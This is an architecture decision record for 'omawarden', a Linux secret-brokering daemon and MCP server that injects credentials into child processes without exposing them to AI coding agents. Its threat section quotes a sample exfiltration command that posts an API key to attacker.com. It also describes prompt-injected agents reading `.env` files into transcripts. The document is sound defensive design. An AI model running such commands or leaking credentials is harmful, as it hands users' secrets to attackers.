# ADR 0026: VaultBroker Subsystem and MCP Agent for Secret Brokering

## Status
Proposed

## Context
AI coding assistants and autonomous agents (such as Claude Code, Cursor, Windsurf, OpenClaw, and background scripts), as well as developers running build and deployment tools, frequently require credentials (such as LLM API keys, GitHub tokens, database URLs, and cloud access keys).

Conventionally, developers place credentials into plaintext `.env` files or execute sync tools (such as `shipkey pull`). In an AI-assisted environment, this introduces critical vulnerabilities:
1. **Prompt Injection & Transcript Leakage**: Any agent with filesystem or shell access can read `.env` (`cat .env`), echoing raw credentials directly into LLM chat transcripts, monitor harnesses, or training logs.
2. **Arbitrary Exfiltration**: An injected agent can replay unlocked credentials against arbitrary external endpoints (e.g., `curl -X POST https://attacker.com -d "$API_KEY"`).

External projects have explored partial patterns:
- **`pass-cli`**: Ephemeral in-memory subprocess environment variable injection (`pass-cli exec --set ...`) and embedded agent self-discovery (`pass-cli skills`).
- **`secrets-broker`**: A zero-knowledge broker removing read tools, enforcing destination binary bindings, applying streaming output redaction, and running on top of an MCP server.
- **`shipkey`**: Provider pattern auto-detection across 40+ platforms, though it still writes plaintext secrets to disk.

`omawarden` already runs a zero-knowledge pure-Rust resident daemon with `mlock` memory protection, Unix domain socket IPC, and Wayland overlay approval cards (ADR 0024). We need a unified **VaultBroker** subsystem that generalizes secret brokering across all developer credentials while providing specialized protection for AI agents on Omarchy Linux.

## Decision

1. **VaultBroker Subsystem**:
   - Establish the **VaultBroker** subsystem inside `omawarden` to arbitrate access to vault ciphers (both standard Secure Notes and Logins) and broker them into child process environments without exposing plaintext secrets to callers.

2. **Dual-Interface Access (`omawarden broker exec` & Native MCP)**:
   - Provide `omawarden broker exec [--item <name>] [--env <VAR=name>] -- <command>` for shell scripts, terminals, and CI.
   - Bundle a native Stdio/Unix-socket Model Context Protocol (MCP) server directly in the `omawarden` binary (`omawarden broker mcp`). AI editors and tools can register `omawarden broker mcp` to obtain structured tool calls (`exec_with_token`, `list_available_tokens`) without shell quoting pitfalls.

3. **Zero-Knowledge References & No-Read Invariant**:
   - The agent only receives and references abstract token/cipher handles (e.g., `vault:item/OpenAI#api_key`).
   - Omawarden strictly exposes **no read tool or command** that prints or returns plaintext secret values to the agent context.

4. **Destination Binding & Approval Cards**:
   - Each cipher or token can be bound to specific executable file paths and argument prefixes (e.g., `/usr/bin/python3 -m my_agent`).
   - Unbound or novel commands trigger an interactive Omarchy Overlay approval card (leveraging `/proc/<pid>/exe` process tracing, as established in ADR 0024), offering `allow-once`, `allow-always` (persisted to policy), or `deny`.

5. **Streaming Output Redaction**:
   - During child execution in `omawarden broker exec` and MCP tool calls, Omawarden streams `stdout` and `stderr` through an in-memory Aho-Corasick matching filter.
   - Any occurrence of the resolved secret values (and substrings of length >= 6) is scrubbed in real-time and replaced with `[REDACTED:VAULT_SECRET]`, preventing credential leakage into logs or agent observation transcripts.

6. **Network Jailing (Linux Namespace Isolation)**:
   - Provide `--no-network` for local tasks (e.g., local test runners, formatters, offline model pipelines). On Linux, Omawarden executes the command inside an isolated network namespace (`unshare(CLONE_NEWNET)`), physically blocking outbound socket connections.

7. **Multi-Variable Injection & Provider Pattern Auto-Inference**:
   - Custom fields on a `Secure Note` or `Login` map directly to environment variables (field name = environment variable name).
   - Omawarden embeds standard environment variable patterns for 40+ providers (e.g., `openai` -> `OPENAI_API_KEY`, `anthropic` -> `ANTHROPIC_API_KEY`). When an item specifies a provider, Omawarden automatically populates the canonical environment variable name.

8. **Project Manifest (`.omawarden.toml`) & Safe Migration**:
   - Support a project-root `.omawarden.toml` manifest file that maps environment variable names to vault cipher references and destination policies. This file contains zero secrets and is safe to commit to version control.
   - Provide `omawarden broker import` to detect existing local `.env` files, import detected keys into Bitwarden/Vaultwarden ciphers, scaffold `.omawarden.toml`, and securely erase the plaintext `.env` files.

9. **Agent Self-Discovery (`omawarden broker skills`)**:
   - Provide `omawarden broker skills` to output structured Markdown instructions describing the zero-exposure execution contract, instructing AI agents to invoke `omawarden broker exec` or MCP tools rather than requesting plaintext keys.

10. **Unlock on Demand**:
    - Consistent with ADR 0024 and ADR 0025, if the vault is locked when a secret is requested, Omawarden summons the Overlay unlock prompt (or Polkit quick-unlock) and waits up to 60 seconds before failing closed.

## Alternatives Considered

- **Local HTTP Reverse Proxy Gateway (e.g., LiteLLM proxy)**: Runs a local HTTP proxy that injects `Authorization: Bearer <key>` into outgoing HTTP requests. While effective for standard REST API requests, it cannot protect non-HTTP secrets (such as GitHub tokens, AWS keys, or local tool credentials) and requires every tool to support custom Base URLs.
- **Pure CLI Wrapper without MCP**: Requires AI coding assistants to invoke bash commands with complex escaping, increasing error rates and shell injection risks.
- **Plaintext `.env` Syncing (Shipkey style)**: Writing keys to `.env.local` defeats prompt-injection defense because any agent with file-read tools can exfiltrate them.

## Consequences

- **Positive**: 
  - Complete elimination of plaintext `.env` files across both AI development and general software development.
  - Prompt injections cannot trick agents into printing secrets due to the absence of read tools and the enforcement of output redaction.
  - Native integration with modern AI coding environments via MCP and terminal workflows via CLI.
  - 100% compatibility with standard Bitwarden and Vaultwarden vaults.
- **Trade-off**: 
  - Subprocess execution wrapper adds a negligible startup latency (a few milliseconds) for process spawning and pipe redirection.
  - First-time command invocations for unbound destinations will prompt the user with an Overlay approval card.
- **Requirement**: 
  - Requires Linux support for namespace unshare (`CLONE_NEWNET`) for the `--no-network` feature.
